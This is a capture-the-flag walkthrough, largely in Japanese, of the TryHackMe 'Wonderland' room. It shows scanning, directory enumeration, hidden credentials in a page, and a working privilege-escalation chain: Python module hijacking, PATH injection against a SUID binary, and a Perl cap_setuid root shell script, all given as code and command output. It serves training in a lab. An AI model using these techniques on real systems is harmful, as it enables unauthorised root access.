# Wonderland CTF

https://tryhackme.com/room/wonderland

## Enumeration

```shell
TARGET=10.201.66.226
sudo bash -c "echo $TARGET   wonderland.thm >> /etc/hosts"
```

### ポートスキャン

```sh
rustscan -a $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 60
80/tcp open  http    syn-ack ttl 60
```

```sh
root@ip-10-201-127-36:~# nmap -sV -p22,80  $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-07 02:10 BST
Nmap scan report for wonderland.thm (10.201.66.226)
Host is up (0.000099s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
MAC Address: 16:FF:F0:19:67:B7 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### dirb

```sh
root@ip-10-201-127-36:~# dirb http://$TARGET

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Aug  7 02:12:10 2025
URL_BASE: http://10.201.66.226/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.201.66.226/ ----
==> DIRECTORY: http://10.201.66.226/img/                                                                
+ http://10.201.66.226/index.html (CODE:301|SIZE:0)                                                     
==> DIRECTORY: http://10.201.66.226/r/                                                                  
                                                                                                        
---- Entering directory: http://10.201.66.226/img/ ----
+ http://10.201.66.226/img/index.html (CODE:301|SIZE:0)                                                 
                                                                                                        
---- Entering directory: http://10.201.66.226/r/ ----
+ http://10.201.66.226/r/a (CODE:301|SIZE:0)                                                            
+ http://10.201.66.226/r/index.html (CODE:301|SIZE:0)                                                   
                                                                                                        
-----------------
END_TIME: Thu Aug  7 02:12:17 2025
DOWNLOADED: 13836 - FOUND: 4
```

/r

```text
Keep Going.
"Would you tell me, please, which way I ought to go from here?"
```

/r/a

```text
Keep Going.
"That depends a good deal on where you want to get to," said the Cat.
```

この要領で次々に階層を掘り下げていく。

```text
Keep Going.
"I don’t much care where—" said Alice.
```

```text
Keep Going.
"Then it doesn’t matter which way you go," said the Cat.
```

```text
Keep Going.
"—so long as I get somewhere,"" Alice added as an explanation.
```

```text
Open the door and enter wonderland
"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."

Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"

"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving the other paw, "lives a March Hare. Visit either you like: they’re both mad."
```

非表示で認証情報が書かれていた。これでSSHログインできた。

```html
<p style="display: none;">alice:[REDACTED]</p>
```

## alice

ユーザー

```sh
alice@wonderland:~$ ls -al /home
total 24
drwxr-xr-x  6 root      root      4096 May 25  2020 .
drwxr-xr-x 23 root      root      4096 May 25  2020 ..
drwxr-xr-x  5 alice     alice     4096 May 25  2020 alice
drwxr-x---  3 hatter    hatter    4096 May 25  2020 hatter
drwxr-x---  2 rabbit    rabbit    4096 May 25  2020 rabbit
drwxr-x---  6 tryhackme tryhackme 4096 May 25  2020 tryhackme
```

/home/alice に root.txt があるが読めない。

```sh
alice@wonderland:~$ ls -al
total 40
drwxr-xr-x 5 alice alice 4096 May 25  2020 .
drwxr-xr-x 6 root  root  4096 May 25  2020 ..
lrwxrwxrwx 1 root  root     9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25  2020 .bash_logout
-rw-r--r-- 1 alice alice 3771 May 25  2020 .bashrc
drwx------ 2 alice alice 4096 May 25  2020 .cache
drwx------ 3 alice alice 4096 May 25  2020 .gnupg
drwxrwxr-x 3 alice alice 4096 May 25  2020 .local
-rw-r--r-- 1 alice alice  807 May 25  2020 .profile
-rw------- 1 root  root    66 May 25  2020 root.txt
-rw-r--r-- 1 root  root  3577 May 25  2020 walrus_and_the_carpenter.py
```

walrus_and_the_carpenter.py はポエムをランダムで表示するコード。  
randomモジュールをインジェクション可能と思われる。

```python
import random
poem = """The sun was shining on the sea,
Shining with all his might:
（中略）
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```

rabbit としてwalrus_and_the_carpenter.pyを実行可能。

```sh
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

random.py を配置。

```python
import os

def choice(seq):
    os.system("/bin/sh")
    return seq[0]
```

rabbitに昇格成功

```sh
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
$ id
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
```

## rabbit

root の SUID がついているバイナリがある。

```sh
$ cd /home/rabbit
$ ls -al
total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
drwxr-xr-x 6 root   root    4096 May 25  2020 ..
lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
```

リバース。date は PATH インジェクション可能か？

```c
void main(void)
{
  setuid(0x3eb);
  setgid(0x3eb);
  puts("Welcome to the tea party!\nThe Mad Hatter will be here soon.");
  system("/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R");
  puts("Ask very nicely, and I will give you some tea while you wait for him");
  getchar();
  puts("Segmentation fault (core dumped)");
  return;
}
```

0x3eb は hatter を指す。

```sh
$ id hatter
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
```

date を配置。

```sh
$ echo '#!/bin/bash' > date
$ echo '/bin/bash -p' >> date
$ chmod +x ./date
```

hatterに昇格成功

```sh
$ export PATH=/home/rabbit:$PATH
$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
```

## hatter

以降、password.txt のパスワードを使って、hatterとしてSSH接続可能。

```sh
hatter@wonderland:/home/hatter$ ls -al
total 28
drwxr-x--- 3 hatter hatter 4096 May 25  2020 .
drwxr-xr-x 6 root   root   4096 May 25  2020 ..
lrwxrwxrwx 1 root   root      9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 hatter hatter  220 May 25  2020 .bash_logout
-rw-r--r-- 1 hatter hatter 3771 May 25  2020 .bashrc
drwxrwxr-x 3 hatter hatter 4096 May 25  2020 .local
-rw-r--r-- 1 hatter hatter  807 May 25  2020 .profile
-rw------- 1 hatter hatter   29 May 25  2020 password.txt
hatter@wonderland:/home/hatter$ cat password.txt
[REDACTED]
```

perl に cap_setuid がついていた。

```sh
hatter@wonderland:~/CVE-2021-3156$ getcap -r / 2>/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

shell.pl を配置。

```pl
#!/usr/bin/perl

use strict;
use warnings;

use POSIX qw(setuid);

setuid(0) or die "setuid failed: $!";
print "UID is now: $<\n";
exec "/bin/sh";
```

root昇格成功。

```sh
hatter@wonderland:~$ perl ./shell.pl
UID is now: 0
# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
```

user.txt は /root に入っていた。

```sh
# find / -name 'user.txt' -type f 2>/dev/null
/root/user.txt
```

## 振り返り

- 今回はたまたま気まぐれで dirsearch や gobuster ではなく dirb を使ったためすぐに発見できた。今後、初手は dirb で列挙するのをテンプレにする。
- もしかして hatter まで昇格したのは無駄足だったのでは？と思ったが、perl自体がaliceには制限されていたので無駄ではなかった。

```sh
alice@wonderland:~$ perl ./shell.pl
-bash: /usr/bin/perl: Permission denied

alice@wonderland:~$ ls -al /usr/bin/perl
-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl
```
